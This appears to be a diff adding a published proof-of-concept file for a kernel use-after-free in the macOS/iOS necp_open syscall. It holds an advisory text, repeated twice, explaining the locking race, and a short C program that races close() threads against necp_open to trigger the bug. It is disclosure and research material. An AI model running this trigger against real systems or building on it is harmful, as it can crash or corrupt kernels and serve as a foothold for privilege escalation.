@@ -1,0 +1,146 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1116
+
+necp_open is a syscall used to obtain a new necp file descriptor
+
+The necp file's fp's fg_data points to a struct necp_fd_data allocated on the heap.
+
+Here's the relevant code from necp_open:
+
+  error = falloc(p, &fp, &fd, vfs_context_current());  <--------------------- (a)
+  if (error != 0) {
+    goto done;
+  }
+
+  if ((fd_data = _MALLOC(sizeof(struct necp_fd_data), M_NECP,
+               M_WAITOK | M_ZERO)) == NULL) {
+    error = ENOMEM;
+    goto done;
+  }
+
+  fd_data->flags = uap->flags;
+  LIST_INIT(&fd_data->clients);
+  lck_mtx_init(&fd_data->fd_lock, necp_fd_mtx_grp, necp_fd_mtx_attr);
+  klist_init(&fd_data->si.si_note);
+  fd_data->proc_pid = proc_pid(p);
+
+  fp->f_fglob->fg_flag = FREAD;
+  fp->f_fglob->fg_ops = &necp_fd_ops;
+  fp->f_fglob->fg_data = fd_data;  <-------------------------- (b)
+
+  proc_fdlock(p);
+
+  *fdflags(p, fd) |= (UF_EXCLOSE | UF_FORKCLOSE);
+  procfdtbl_releasefd(p, fd, NULL);
+  fp_drop(p, fd, fp, 1);
+  proc_fdunlock(p);  <--------------------- (c)
+
+  *retval = fd;
+
+  lck_rw_lock_exclusive(&necp_fd_lock); <---------------- (d)
+  LIST_INSERT_HEAD(&necp_fd_list, fd_data, chain); <------(e)
+  lck_rw_done(&necp_fd_lock);
+
+at (a) a new file descriptor and file object is allocated for the calling process
+at (b) that new file's fg_data is set to the fd_data heap allocation
+at (c) the process fd table is unlocked meaning that other processes can now look up
+ the new fd and get the associated fp
+
+at (d) the necp_fd_lock is taken then at (e) the fd_data is enqueued into the necp_fd_list
+
+The bug is that the fd_data is owned by the fp so that after we drop the proc_fd lock at (c)
+another thread can call close on the new fd which will free fd_data before we enqueue it at (e).
+
+tested on MacOS 10.12.3 (16D32) on MacbookAir5,2 
+
+in: "...that other processes can now look up the new fd and get the associated fp..." I meant threads, not processes!
+
+*/
+
+// ianbeer
+#if 0
+MacOS/iOS kernel uaf due to bad locking in necp_open
+
+necp_open is a syscall used to obtain a new necp file descriptor
+
+The necp file's fp's fg_data points to a struct necp_fd_data allocated on the heap.
+
+Here's the relevant code from necp_open:
+
+	error = falloc(p, &fp, &fd, vfs_context_current());  <--------------------- (a)
+	if (error != 0) {
+		goto done;
+	}
+
+	if ((fd_data = _MALLOC(sizeof(struct necp_fd_data), M_NECP,
+						   M_WAITOK | M_ZERO)) == NULL) {
+		error = ENOMEM;
+		goto done;
+	}
+
+	fd_data->flags = uap->flags;
+	LIST_INIT(&fd_data->clients);
+	lck_mtx_init(&fd_data->fd_lock, necp_fd_mtx_grp, necp_fd_mtx_attr);
+	klist_init(&fd_data->si.si_note);
+	fd_data->proc_pid = proc_pid(p);
+
+	fp->f_fglob->fg_flag = FREAD;
+	fp->f_fglob->fg_ops = &necp_fd_ops;
+	fp->f_fglob->fg_data = fd_data;  <-------------------------- (b)
+
+	proc_fdlock(p);
+
+	*fdflags(p, fd) |= (UF_EXCLOSE | UF_FORKCLOSE);
+	procfdtbl_releasefd(p, fd, NULL);
+	fp_drop(p, fd, fp, 1);
+	proc_fdunlock(p);  <--------------------- (c)
+
+	*retval = fd;
+
+	lck_rw_lock_exclusive(&necp_fd_lock); <---------------- (d)
+	LIST_INSERT_HEAD(&necp_fd_list, fd_data, chain); <------(e)
+	lck_rw_done(&necp_fd_lock);
+
+at (a) a new file descriptor and file object is allocated for the calling process
+at (b) that new file's fg_data is set to the fd_data heap allocation
+at (c) the process fd table is unlocked meaning that other processes can now look up
+ the new fd and get the associated fp
+
+at (d) the necp_fd_lock is taken then at (e) the fd_data is enqueued into the necp_fd_list
+
+The bug is that the fd_data is owned by the fp so that after we drop the proc_fd lock at (c)
+another thread can call close on the new fd which will free fd_data before we enqueue it at (e).
+
+tested on MacOS 10.12.3 (16D32) on MacbookAir5,2 
+#endif
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <pthread.h>
+
+#include <sys/syscall.h>
+
+int necp_open(int flags) {
+  return syscall(SYS_necp_open, flags);
+}
+
+void* closer(void* arg) {
+  while(1) {
+    close(3);
+  }
+}
+
+int main() {
+  for (int i = 0; i < 10; i++) {
+    pthread_t t;
+    pthread_create(&t, NULL, closer, NULL);
+  }
+  
+  while (1) {
+    int fd = necp_open(0);
+    close(fd);
+  }
+
+  return 0;
+}
